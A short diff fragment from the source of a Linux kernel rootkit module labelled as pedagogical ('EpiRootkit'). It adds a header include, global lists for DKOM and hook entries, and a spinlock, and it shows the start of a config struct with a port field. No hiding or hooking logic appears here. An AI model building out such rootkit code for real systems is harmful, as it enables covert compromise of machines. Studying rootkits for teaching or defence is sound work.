@@ -21,11 +21,17 @@
 #include <linux/ctype.h>
 #include <linux/jiffies.h>
 #include <linux/delay.h>
+#include "epirootkit.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Team_Rodrien");
 MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
 MODULE_VERSION("0.1");
+
+// Global variables
+struct list_head dkom_entries = LIST_HEAD_INIT(dkom_entries);
+struct list_head hook_entries = LIST_HEAD_INIT(hook_entries);
+DEFINE_SPINLOCK(hook_lock);
 
 struct rootkit_config {
     int port;
